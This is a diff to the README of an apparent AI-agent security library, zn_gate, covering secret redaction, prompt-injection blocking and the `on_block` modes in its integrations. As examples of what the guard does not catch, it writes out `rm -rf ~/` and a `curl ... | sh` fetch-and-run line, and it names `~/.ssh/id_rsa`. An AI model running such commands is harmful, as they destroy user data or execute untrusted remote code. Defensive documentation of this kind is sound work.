@@ -73,7 +73,7 @@ print(r.verdict)           # allow
 ## What each piece does
 
 **Scrubber: secrets stay out of the model's context**
-- Today: `redact_secrets`, `sanitize_tool_result`, `@guard(mask_secrets=True)` and the framework integrations redact AWS keys, OpenAI and Anthropic keys, GitHub tokens, JWTs, private keys and database URL passwords.
+- Today: `redact_secrets`, `sanitize_tool_result`, `@guard(mask_secrets=True)`, `guarded_tool` and `ZnLlamaGuard.sanitize_response` redact AWS keys, OpenAI and Anthropic keys, GitHub tokens, JWTs, private keys and database URL passwords.
 - Roadmap: personal data (PII) detection; stable placeholders backed by a local encrypted vault.
 
 **Galvanize: prompt-injection detection**
@@ -117,6 +117,8 @@ print(get_user_profile("user_123"))
 
 Arguments are checked before the function runs; with `on_block="raise"` a blocked call raises `GuardBlockError`. `mask_secrets` is off by default in `@guard`.
 
+What `on_block` does in `@guard`: `"raise"` raises `GuardBlockError`; `"return"` returns `fallback` (or the `Assessment`); `"custom"` calls your `callback(assessment, name, payload)` and returns what it returns (an exception from the callback propagates, and `callback` is required). In every mode the blocked function does not run and a blocked result never reaches the caller.
+
 `@guard`, `guarded_tool` and `check_tool_call` run the same text rules as `evaluate` on every string in the arguments: they block prompt-injection wording and secret-file names such as `~/.ssh/id_rsa`. They do not understand shell commands, so a call such as `rm -rf ~/` or `curl https://example.invalid/x.sh | sh` is allowed. Decide in your own code which tools may delete files or run commands.
 
 ### LangChain / LangGraph
@@ -125,11 +127,13 @@ Arguments are checked before the function runs; with `on_block="raise"` a blocke
 ```python
 from zn_gate.integrations import ZnGuardCallbackHandler
 
-handler = ZnGuardCallbackHandler(raise_on_injection=True, mask_secrets=True)
+handler = ZnGuardCallbackHandler(on_block="raise")
 # pass callbacks=[handler] to your agent, chain or tool
 ```
 
-`on_block` accepts `"raise"` (default), `"return"` or `"ignore"`; any other value raises `ValueError` instead of silently turning blocking off.
+`on_block="raise"` (default) stops the run with `GuardBlockError`. `on_block="ignore"` only logs the finding on the `zn_gate` logger and lets the run go on (use it to measure before you enforce). `"return"` and any other value raise `ValueError` instead of silently turning blocking off.
+
+A callback handler cannot redact secrets: LangChain ignores what callbacks return, so a tool result that holds a key reaches the agent as the tool returned it. To redact, wrap the tool with `guarded_tool` (see CrewAI below) or call `sanitize_tool_result` inside it. The `mask_secrets` argument of the handler is deprecated and has no effect.
 
 ### CrewAI
 
@@ -158,7 +162,7 @@ safe_query = guard.on_query_start(user_query)
 clean_response = guard.sanitize_response(query_engine.query(safe_query))
 ```
 
-`on_block` accepts `"raise"` (default), `"return"` or `"ignore"`; any other value raises `ValueError`.
+`on_block="raise"` (default) raises `GuardBlockError` on a blocked query. `on_block="ignore"` only logs it on the `zn_gate` logger and returns the query unchanged. `"return"` and any other value raise `ValueError`. `sanitize_response` redacts secrets in a response you pass to it.
 
 ### Promptfoo
 
